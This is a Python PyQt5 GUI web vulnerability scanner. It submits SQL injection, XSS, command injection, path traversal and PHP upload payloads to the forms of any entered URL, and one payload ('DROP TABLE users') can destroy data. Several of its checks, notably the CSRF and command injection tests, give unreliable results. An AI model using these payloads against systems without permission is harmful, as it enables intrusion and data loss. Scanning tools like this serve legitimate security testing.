import sys
import os
import requests
from bs4 import BeautifulSoup
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit, QMessageBox, QProgressBar
)
from PyQt5.QtGui import QIcon, QFont
from PyQt5.QtCore import Qt, QThread, pyqtSignal

class VulnerabilityScanner(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.worker = ScanWorker()
        self.worker.finished.connect(self.scan_finished)
        self.worker.progress.connect(self.update_progress)

    def initUI(self):
        self.setWindowTitle('Vulnerability Scanner')
        self.setWindowIcon(QIcon('icon.png'))
        self.setGeometry(100, 100, 800, 600)

        # URL input
        self.url_label = QLabel('Enter Target URL:', self)
        self.url_input = QLineEdit(self)

        # Scan button
        self.scan_button = QPushButton('Scan', self)
        self.scan_button.clicked.connect(self.start_scan)

        # Results text area
        self.results_label = QLabel('Results:', self)
        self.results_text = QTextEdit(self)
        self.results_text.setReadOnly(True)

        # Progress bar
        self.progress_label = QLabel('Progress:', self)
        self.progress_bar = QProgressBar(self)
        self.progress_bar.setMinimum(0)
        self.progress_bar.setMaximum(100)
        self.progress_bar.setValue(0)

        # Layout
        url_layout = QHBoxLayout()
        url_layout.addWidget(self.url_label)
        url_layout.addWidget(self.url_input)
        url_layout.addWidget(self.scan_button)

        main_layout = QVBoxLayout()
        main_layout.addLayout(url_layout)
        main_layout.addWidget(self.progress_label)
        main_layout.addWidget(self.progress_bar)
        main_layout.addWidget(self.results_label)
        main_layout.addWidget(self.results_text)

        self.setLayout(main_layout)

    def start_scan(self):
        url = self.url_input.text().strip()
        if not url.startswith('http'):
            url = 'http://' + url  # Ensure URL starts with http:// or https://

        # Disable scan button during scanning
        self.scan_button.setEnabled(False)
        self.results_text.clear()

        # Start scanning in worker thread
        self.worker.set_url(url)
        self.worker.start()

    def scan_finished(self, vulnerabilities):
        # Enable scan button after scanning finished
        self.scan_button.setEnabled(True)

        # Display results
        self.display_results(vulnerabilities)

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def display_results(self, vulnerabilities):
        if vulnerabilities:
            result_text = "Vulnerabilities found:\n\n"
            for vuln in vulnerabilities:
                result_text += f"Vulnerability Type: {vuln['Vulnerability Type']}\n"
                result_text += f"Target URL: {vuln['Target URL']}\n"
                result_text += f"Details:\n"
                result_text += f"  Payload: {vuln.get('Payload', '')}\n"
                result_text += f"  Response: {vuln['Response']}\n\n"
        else:
            result_text = "No vulnerabilities found."

        self.results_text.setPlainText(result_text)

class ScanWorker(QThread):
    finished = pyqtSignal(list)
    progress = pyqtSignal(int)

    def __init__(self):
        super().__init__()
        self.url = ""

    def set_url(self, url):
        self.url = url

    def run(self):
        try:
            response = requests.get(self.url)
            response.raise_for_status()  # Raise an exception for bad responses
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            inputs = soup.find_all(['input', 'textarea', 'select'])

            # Perform tests
            sql_vulnerabilities = self.test_sql_injection(self.url, forms)
            xss_vulnerabilities = self.test_xss(self.url, forms)
            csrf_vulnerabilities = self.test_csrf(self.url, forms)
            command_injection_vulnerabilities = self.test_command_injection(self.url, forms)
            file_upload_vulnerabilities = self.test_file_upload_vulnerability(self.url, forms)
            deep_vulnerabilities = self.deep_vulnerability_scanning(self.url, forms)

            all_vulnerabilities = (
                sql_vulnerabilities +
                xss_vulnerabilities +
                csrf_vulnerabilities +
                command_injection_vulnerabilities +
                file_upload_vulnerabilities +
                deep_vulnerabilities
            )

            self.finished.emit(all_vulnerabilities)

        except requests.exceptions.RequestException as e:
            print(f"An error occurred while crawling the URL: {e}")
            self.finished.emit([])

    def test_sql_injection(self, url, forms):
        vulnerabilities = []
        sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT 1,2,3 --"]

        for form in forms:
            action = form.get('action')
            if action:
                method = form.get('method', 'get')

                for payload in sql_payloads:
                    form_data = {input.get('name'): payload for input in form.find_all('input')}
                    try:
                        if method.lower() == 'post':
                            response = requests.post(url + action, data=form_data)
                        else:
                            response = requests.get(url + action, params=form_data)

                        if "error" in response.text or "syntax" in response.text:
                            vulnerability_info = {
                                "Vulnerability Type": "SQL Injection",
                                "Target URL": url + action,
                                "Payload": payload,
                                "Response": response.text[:200]  # Only show first 200 characters of response
                            }
                            vulnerabilities.append(vulnerability_info)
                    except Exception as e:
                        print(f"An error occurred while testing SQL Injection: {str(e)}")

        return vulnerabilities

    def test_xss(self, url, forms):
        vulnerabilities = []
        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

        for form in forms:
            action = form.get('action')
            if action:
                method = form.get('method', 'get')

                for payload in xss_payloads:
                    form_data = {input.get('name'): payload for input in form.find_all('input')}
                    try:
                        if method.lower() == 'post':
                            response = requests.post(url + action, data=form_data)
                        else:
                            response = requests.get(url + action, params=form_data)

                        if payload in response.text:
                            vulnerability_info = {
                                "Vulnerability Type": "XSS",
                                "Target URL": url + action,
                                "Payload": payload,
                                "Response": response.text[:200]  # Only show first 200 characters of response
                            }
                            vulnerabilities.append(vulnerability_info)
                    except Exception as e:
                        print(f"An error occurred while testing XSS: {str(e)}")

        return vulnerabilities

    def test_csrf(self, url, forms):
        vulnerabilities = []

        for form in forms:
            action = form.get('action')
            if action:
                method = form.get('method', 'get')

                form_data = {input.get('name'): 'test' for input in form.find_all('input')}

                try:
                    if method.lower() == 'post':
                        response = requests.post(url + action, data=form_data)
                    else:
                        response = requests.get(url + action, params=form_data)

                    if "csrf" not in response.text.lower():
                        vulnerability_info = {
                            "Vulnerability Type": "CSRF",
                            "Target URL": url + action,
                            "Response": response.text[:200]  # Only show first 200 characters of response
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing CSRF: {str(e)}")

        return vulnerabilities

    def test_command_injection(self, url, forms):
        vulnerabilities = []

        for form in forms:
            action = form.get('action')
            if action:
                method = form.get('method', 'get')

                command_injection_payloads = ["'; ls -la; #", "'; cat /etc/passwd; #"]

                for payload in command_injection_payloads:
                    form_data = {input.get('name'): payload for input in form.find_all('input')}

                    try:
                        if method.lower() == 'post':
                            response = requests.post(url + action, data=form_data)
                        else:
                            response = requests.get(url + action, params=form_data)

                        if "Permission denied" in response.text:
                            vulnerability_info = {
                                "Vulnerability Type": "Command Injection",
                                "Target URL": url + action,
                                "Payload": payload,
                                "Response": response.text[:200]  # Only show first 200 characters of response
                            }
                            vulnerabilities.append(vulnerability_info)
                    except Exception as e:
                        print(f"An error occurred while testing Command Injection: {str(e)}")

        return vulnerabilities

    def test_file_upload_vulnerability(self, url, forms):
        vulnerabilities = []

        for form in forms:
            action = form.get('action')
            if action:
                method = form.get('method', 'post')  # Assume file upload forms use POST method

                # Customize this according to the file upload input names in the form
                file_upload_data = {
                    'file': ('malicious_script.php', '<?php echo "Hello World!"; ?>', 'text/plain')
                }

                try:
                    response = requests.post(url + action, files=file_upload_data)

                    if "malicious_script.php" in response.text:
                        vulnerability_info = {
                            "Vulnerability Type": "File Upload Vulnerability",
                            "Target URL": url + action,
                            "Payload": "malicious_script.php",
                            "Response": response.text[:200]  # Only show first 200 characters of response
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing File Upload Vulnerability: {str(e)}")

        return vulnerabilities

    def deep_vulnerability_scanning(self, url, forms):
        vulnerabilities = []

        # Example: Perform additional tests like Path Traversal
        path_traversal_vulnerabilities = self.test_path_traversal(url, forms)
        vulnerabilities.extend(path_traversal_vulnerabilities)

        # Add more tests as needed

        return vulnerabilities

    def test_path_traversal(self, url, forms):
        vulnerabilities = []

        for form in forms:
            action = form.get('action')
            if action:
                method = form.get('method', 'get')

                path_traversal_payload = "../../../../etc/passwd"
                form_data = {input.get('name'): path_traversal_payload for input in form.find_all('input')}

                try:
                    if method.lower() == 'post':
                        response = requests.post(url + action, data=form_data)
                    else:
                        response = requests.get(url + action, params=form_data)

                    if "root:" in response.text:
                        vulnerability_info = {
                            "Vulnerability Type": "Path Traversal",
                            "Target URL": url + action,
                            "Payload": path_traversal_payload,
                            "Response": response.text[:200]  # Only show first 200 characters of response
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing Path Traversal: {str(e)}")

        return vulnerabilities

def main():
    app = QApplication(sys.argv)
    window = VulnerabilityScanner()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
